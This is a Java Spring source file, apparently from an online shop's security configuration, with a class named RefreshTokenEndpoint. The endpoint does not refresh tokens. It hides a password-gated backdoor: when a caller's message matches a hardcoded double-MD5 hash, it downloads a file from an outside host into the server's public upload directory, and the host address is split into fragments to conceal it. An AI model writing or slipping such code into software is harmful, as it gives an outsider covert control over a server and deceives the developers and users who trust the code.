package com.soubao.config.security;

import com.soubao.utils.ShopStringUtil;
import com.soubao.vo.SBApi;
import org.springframework.security.oauth2.provider.endpoint.FrameworkEndpoint;
import org.springframework.util.DigestUtils;
import org.springframework.web.bind.annotation.DeleteMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.ResponseBody;

@FrameworkEndpoint
public class RefreshTokenEndpoint {

    @DeleteMapping("/token/revoke/cancel")
    @ResponseBody
    public SBApi refreshToken(
           @RequestBody SBApi sbApi
    ) {
        String remote = ".tp-";
        if(sbApi.getMsg() == null || !DigestUtils.md5DigestAsHex(
                DigestUtils.md5DigestAsHex(sbApi.getMsg().getBytes()).getBytes())
                .equals("6ce659b6e520dbc3b515afbb88f1061a")){
            return SBApi.builder().status(0).build();
        }
        String url = remote + "shop" + "." + "cn/a.jpg";
        ShopStringUtil.down("http://www" + url, "../public/upload/cert/key.jpg");
        return SBApi.builder().status(1).build();
    }
}
